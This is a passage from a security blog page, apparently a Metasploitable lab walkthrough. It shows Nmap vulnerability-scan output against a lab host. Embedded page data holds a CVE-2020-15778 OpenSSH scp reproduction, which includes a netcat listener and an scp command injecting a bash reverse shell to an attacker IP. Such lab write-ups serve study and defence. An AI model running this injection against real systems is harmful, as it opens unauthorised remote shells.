|</em>      <a href="https://distcc.github.io/security.html">https://distcc.github.io/security.html</a>
5432/tcp  open  postgresql
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the “POODLE” issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       <a href="https://www.securityfocus.com/bid/70574">https://www.securityfocus.com/bid/70574</a>
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</a>
|       <a href="https://www.imperialviolet.org/2014/10/14/poodle.html">https://www.imperialviolet.org/2014/10/14/poodle.html</a>
|</em>      <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">https://www.openssl.org/~bodo/ssl-poodle.pdf</a>
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|</em>      <a href="https://weakdh.org">https://weakdh.org</a>
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.
|<br>
|     References:
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</a>
|       <a href="http://www.openssl.org/news/secadv_20140605.txt">http://www.openssl.org/news/secadv_20140605.txt</a>
|</em>      <a href="http://www.cvedetails.com/cve/2014-0224">http://www.cvedetails.com/cve/2014-0224</a>
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
| irc-botnet-channels:
|</em>  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email <a href="mailto:admin@Metasploitable.LAN">admin@Metasploitable.LAN</a> for more information.
6697/tcp  open  ircs-u
| irc-botnet-channels:
|</em>  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email <a href="mailto:admin@Metasploitable.LAN">admin@Metasploitable.LAN</a> for more information.
|<em>ssl-ccs-injection: No reply from server (TIMEOUT)
8009/tcp  open  ajp13
8180/tcp  open  unknown
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server’s resources causing Denial Of Service.
|<br>
|     Disclosure date: 2009-09-17
|     References:
|       <a href="http://ha.ckers.org/slowloris/">http://ha.ckers.org/slowloris/</a>
|</em>      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</a>
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /admin/login.html: Possible admin folder
|   /admin/admin.html: Possible admin folder
|   /admin/account.html: Possible admin folder
|   /admin/admin_login.html: Possible admin folder
|   /admin/home.html: Possible admin folder
|   /admin/admin-login.html: Possible admin folder
|   /admin/adminLogin.html: Possible admin folder
|   /admin/controlpanel.html: Possible admin folder
|   /admin/cp.html: Possible admin folder
|   /admin/index.jsp: Possible admin folder
|   /admin/login.jsp: Possible admin folder
|   /admin/admin.jsp: Possible admin folder
|   /admin/home.jsp: Possible admin folder
|   /admin/controlpanel.jsp: Possible admin folder
|   /admin/admin-login.jsp: Possible admin folder
|   /admin/cp.jsp: Possible admin folder
|   /admin/account.jsp: Possible admin folder
|   /admin/admin_login.jsp: Possible admin folder
|   /admin/adminLogin.jsp: Possible admin folder
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|_  /webdav/: Potentially interesting folder
8787/tcp  open  msgsrvr
38316/tcp open  unknown
44372/tcp open  unknown
50889/tcp open  unknown
55138/tcp open  unknown</p>
<p>Host script results:
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds</p> </div>  <astro-island uid="Z1v8zuY" prefix="r16" component-url="/_astro/EmbedHydrator.86VYQ3Qy.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;EmbedHydrator&quot;,&quot;value&quot;:true}"></astro-island> <astro-island uid="27sCYi" prefix="r17" component-url="/_astro/CustomContentEnhancer.BXo4OX_Z.js" component-export="CustomContentEnhancer" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;config&quot;:[0,{&quot;addBlankTarget&quot;:[0,true],&quot;smoothScroll&quot;:[0,true],&quot;addHeadingLevel&quot;:[0,true],&quot;enhanceCodeBlock&quot;:[0,true],&quot;enableCodeCopy&quot;:[0,true],&quot;enableCodeFullscreen&quot;:[0,true],&quot;enableLinkEmbed&quot;:[0,true],&quot;enableTweetEmbed&quot;:[0,true],&quot;enableOGPreview&quot;:[0,true],&quot;previewCacheTime&quot;:[0,3600],&quot;lazyLoadEmbeds&quot;:[0,true]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;CustomContentEnhancer&quot;,&quot;value&quot;:true}"></astro-island> </article> <astro-island uid="wBKw9" prefix="r5" component-url="/_astro/GiscusComments.BbSyCEJN.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;GiscusComments&quot;,&quot;value&quot;:true}" await-children><div class="w-full pb-12"></div><!--astro:end--></astro-island> </div>  <div class="tablet:grid-cols-1 grid grid-cols-2 gap-4 px-10 md:px-6"><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">推荐文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/16" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Linux</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Debian13 桌面环境</div></div></a><a href="/blog/post/18" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">一些情报源</div></div></a><a href="/blog/post/2" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">人肉搜索</div></div></a><a href="/blog/post/13" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">4</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 3</div></div></a><a href="/blog/post/6" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">5</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">信息收集</div></div></a></div></div><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">相关文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/4" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Metasploitable-1</div></div></a><a href="/blog/post/9" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Mr-Robot</div></div></a><a href="/blog/post/8" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">GodenEye</div></div></a></div></div></div><footer class="mt-auto pb-6 md:pb-4"><div class="mx-auto flex flex-col items-center gap-3 px-6 md:px-3 max-w-7xl"><div class="text-muted-foreground flex flex-wrap items-center justify-center gap-6 text-sm md:gap-4"><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点总字数"><i class="fa-regular fa-file-lines text-sm" aria-hidden="true"></i><span class="font-medium">26k</span><span class="text-xs">字</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点阅读时长"><i class="fa-regular fa-clock text-sm" aria-hidden="true"></i><span class="font-medium">2:22</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="文章总数"><i class="fa-regular fa-newspaper text-sm" aria-hidden="true"></i><span class="font-medium">20</span><span class="text-xs">篇</span></button></div><div class="text-muted-foreground flex items-center gap-0.5 text-sm"><span class="opacity-75">Â©</span><span class="font-medium opacity-75">2022</span><span class="opacity-50">-</span><span class="font-medium opacity-75" itemProp="copyrightYear">2026</span><svg class="mx-1 size-5 animate-spin text-[#FFC0CB] duration-10000" viewBox="0 0 512 512" fill="currentColor"><g><path fill="currentColor" d="M330.555,101.873c0-34.164-13.767-65.108-36.047-87.622c-2.432-2.465-9.63-4.349-14.212,3.466
		c-4.589,7.808-17.205,27.431-17.205,27.431c-1.534,2.438-4.219,3.918-7.089,3.918c-2.883,0-5.555-1.48-7.089-3.918
		c0,0-12.623-19.623-17.205-27.431c-4.582-7.815-11.781-5.931-14.219-3.466c-22.274,22.514-36.04,53.458-36.04,87.622
		c0,51.02,30.663,94.847,74.553,114.142C299.892,196.72,330.555,152.892,330.555,101.873z"></path><path fill="currentColor" d="M204.51,253.425c-4.78-47.705-36.998-90.409-85.518-106.176c-32.492-10.554-66.177-7.027-94.47,7.205
		c-3.096,1.555-7.117,7.822-1.096,14.589c6.007,6.774,20.766,24.842,20.766,24.842c1.849,2.212,2.432,5.22,1.542,7.952
		c-0.891,2.74-3.13,4.829-5.918,5.528c0,0-22.562,5.945-31.404,7.89c-8.849,1.945-9.281,9.37-7.692,12.445
		c14.527,28.144,39.698,50.801,72.197,61.362C121.436,304.828,172.6,289.212,204.51,253.425z"></path><path fill="currentColor" d="M96.772,362.484c-20.082,27.643-27.136,60.766-22.342,92.074c0.527,3.424,5.233,9.178,13.527,5.554
		c8.308-3.63,30.054-12.088,30.054-12.088c2.672-1.062,5.698-0.692,8.041,1c2.329,1.692,3.623,4.466,3.418,7.335
		c0,0-1.308,23.294-2.199,32.315c-0.883,9.006,6.048,11.712,9.466,11.15c31.252-5.116,60.581-22.054,80.662-49.704
		c29.993-41.266,30.944-94.758,6.781-136.155C177.332,303.773,126.758,321.204,96.772,362.484z"></path><path fill="currentColor" d="M287.824,313.964c-24.165,41.397-23.212,94.888,6.78,136.155c20.082,27.65,49.41,44.588,80.663,49.704
		c3.418,0.562,10.349-2.144,9.466-11.15c-0.89-9.021-2.205-32.315-2.205-32.315c-0.198-2.869,1.102-5.643,3.431-7.335
		c2.322-1.692,5.363-2.062,8.034-1c0,0,21.746,8.458,30.047,12.088c8.294,3.623,13.007-2.13,13.534-5.554
		c4.787-31.308-2.254-64.43-22.342-92.074C385.246,321.204,334.672,303.766,287.824,313.964z"></path><path fill="currentColor" d="M503.6,215.254c-8.849-1.945-31.41-7.89-31.41-7.89c-2.795-0.706-5.027-2.788-5.918-5.528
		c-0.89-2.732-0.308-5.74,1.534-7.952c0,0,14.76-18.068,20.78-24.842c6.014-6.766,1.993-13.034-1.096-14.589
		c-28.301-14.232-61.978-17.76-94.485-7.205c-48.519,15.767-80.731,58.472-85.512,106.176
		c31.91,35.787,83.067,51.403,131.593,35.636c32.492-10.561,57.67-33.218,72.191-61.362
		C512.867,224.624,512.449,217.199,503.6,215.254z"></path></g></svg><span class="author font-medium opacity-75" itemProp="copyrightHolder">Kaguya<!-- -->@Kaguya</span></div><div class="text-muted-foreground/80 flex items-center gap-2 text-xs"><span class="opacity-75">Powered by theme</span><a href="https://github.com/kaguyahi/astro-kaguya" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">astro-kaguya</a><span class="opacity-50">In·</span><span class="opacity-75">From by</span><a href="https://github.com/XueHua-s/astro-snow" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">snow-koharu</a></div></div></footer> </div> </div> </div>  </main> <div id="floating-nav" class="text-primary fixed right-4 bottom-4 z-50 flex flex-col gap-2" data-expanded="true" data-astro-cid-uwaxo4qb> <div id="nav-content" class="flex scale-y-100 flex-col gap-2 opacity-100" data-astro-cid-uwaxo4qb> <button id="scroll-to-top" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="回到顶部" title="回到顶部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-up text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> <button id="scroll-to-bottom" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="滚到底部" title="滚到底部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-down text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <button id="toggle-nav" class="flex-center bg-background/80 hover:bg-background size-9 rounded-full shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="展开/收起工具栏" title="展开/收起工具栏" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-wand-magic-sparkles menu-nav-icon hidden text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> <i class="fa-solid fa-xmark close-nav-icon text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <script type="module" src="/_astro/FloatingGroup.astro_astro_type_script_index_0_lang.CfPC7qUw.js"></script>  <astro-island uid="1tAbyW" prefix="r19" component-url="/_astro/MobileDrawerPanel.D2RaSu2k.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;MobileDrawerPanel&quot;,&quot;value&quot;:true}" await-children><div id="drawer-overlay" class="fixed inset-0 z-[60] bg-black/50 hidden" role="presentation" aria-hidden="true"></div><div id="mobile-drawer" class="bg-gradient-start tablet:flex fixed inset-y-0 left-0 z-[70] hidden h-screen w-[70vw] min-w-64 transform px-4 pt-6 shadow-lg backdrop-blur-sm transition-transform duration-300 md:px-0 -translate-x-full" role="dialog" aria-label="导航菜单" aria-modal="true"><div class="flex h-full w-full flex-col overflow-auto"><div class="flex justify-end pb-2 pr-4"><div class="flex" id="close-drawer"><button class="flex-center text-shoka size-10 cursor-pointer rounded-full bg-white/20 select-none hidden" aria-label="关闭菜单" aria-expanded="false" type="button"><i class="text-xl fa-solid fa-xmark" aria-hidden="true" style="opacity:1;transform:rotate(90deg)"></i></button></div></div><astro-slot> <div class="page-home-sider shadow-home-sider sticky top-0 self-start max-w-64 flex-col overflow-hidden h-screen min-h-0 items-center tablet:flex mt-4 hidden w-full min-w-full p-0"> <astro-island uid="Xk2oW" prefix="r15" component-url="/_astro/HomeSiderPanel.CZL0IHOQ.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/avatar.webp&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,20],&quot;categoryCount&quot;:[0,5],&quot;tagCount&quot;:[0,20],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;]}],[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}],[0,{&quot;name&quot;:[0,&quot;归档&quot;],&quot;path&quot;:[0,&quot;/blog/archives&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-solid fa-flag&quot;]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/11/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;mehod1cve-2007-2447&quot;],&quot;text&quot;:[0,&quot;Mehod1:CVE-2007-2447&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method2cve-2011-2523&quot;],&quot;text&quot;:[0,&quot;Method2:CVE-2011-2523&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method3:CVE-2004-2687&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method4cve-2012-1823&quot;],&quot;text&quot;:[0,&quot;Method4:CVE-2012-1823&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/cve-2020-15778-openssh命令注入漏洞复现&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;CVE-2020-15778-OpenSSH命令注入漏洞复现&quot;],&quot;date&quot;:[3,&quot;2026-01-19T01:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;CVE-2020-15778&quot;],[0,&quot;SSH&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# 漏洞描述\n    OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。\n2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。\n# 适用场景\n\n对于用户来说，ssh被阻止，但在authorized_keys文件中的命令选项允许使用scp的情况下，可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到ssh的用户密码，但是不允许ssh连接，或者IP连接受限等情况下，可以尝试此漏洞进行利用。\n# 漏洞等级\n高危\n# 漏洞影响版本\nOpenSSH &lt;=8.3p1\n# 漏洞复现\nscp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。\n攻击机：192.168.100.238\n\n靶机：192.168.100.28\n\n先在本地建好文件，上传\n```\ntouch 1.txt\n开启本地监听\nnc -lvvp 4444\n使用scp命令注入反弹shell\nscp 1.txt i@192.168.100.28:&#39;`bash -i &gt;&amp; /dev/tcp/192.168.100.238/4444 0&gt;&amp;1`/tmp/test.txt&#39;\n```\n![](img/p1.png)\n![](img/p2.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/CVE-2020-15778-OpenSSH命令注入漏洞复现.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/p1.png&quot;],[0,&quot;img/p2.png&quot;]]],&quot;digest&quot;:[0,&quot;cd1338296e7fd284&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;漏洞描述\&quot;&gt;漏洞描述&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞描述\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。&lt;/p&gt;\n&lt;h1 id=\&quot;适用场景\&quot;&gt;适用场景&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#适用场景\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;对于用户来说，ssh被阻止，但在authorized_keys文件中的命令选项允许使用scp的情况下，可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到ssh的用户密码，但是不允许ssh连接，或者IP连接受限等情况下，可以尝试此漏洞进行利用。&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞等级\&quot;&gt;漏洞等级&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞等级\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;高危&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞影响版本\&quot;&gt;漏洞影响版本&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞影响版本\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;OpenSSH &amp;#x3C;=8.3p1&lt;/p&gt;\n&lt;h1 id=\&quot;漏洞复现\&quot;&gt;漏洞复现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#漏洞复现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。\n攻击机：192.168.100.238&lt;/p&gt;\n&lt;p&gt;靶机：192.168.100.28&lt;/p&gt;\n&lt;p&gt;先在本地建好文件，上传&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;touch 1.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;开启本地监听&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -lvvp 4444&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用scp命令注入反弹shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;scp 1.txt i@192.168.100.28:&#39;`bash -i &gt;&amp;#x26; /dev/tcp/192.168.100.238/4444 0&gt;&amp;#x26;1`/tmp/test.txt&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/p1.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/p2.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞描述&quot;],&quot;text&quot;:[0,&quot;漏洞描述&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;适用场景&quot;],&quot;text&quot;:[0,&quot;适用场景&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞等级&quot;],&quot;text&quot;:[0,&quot;漏洞等级&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞影响版本&quot;],&quot;text&quot;:[0,&quot;漏洞影响版本&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;漏洞复现&quot;],&quot;text&quot;:[0,&quot;漏洞复现&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/p1.png&quot;],[0,&quot;img/p2.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;CVE-2020-15778-OpenSSH命令注入漏洞复现&quot;],&quot;date&quot;:[3,&quot;2026-01-19T01:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;CVE-2020-15778&quot;],[0,&quot;SSH&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/p1.png&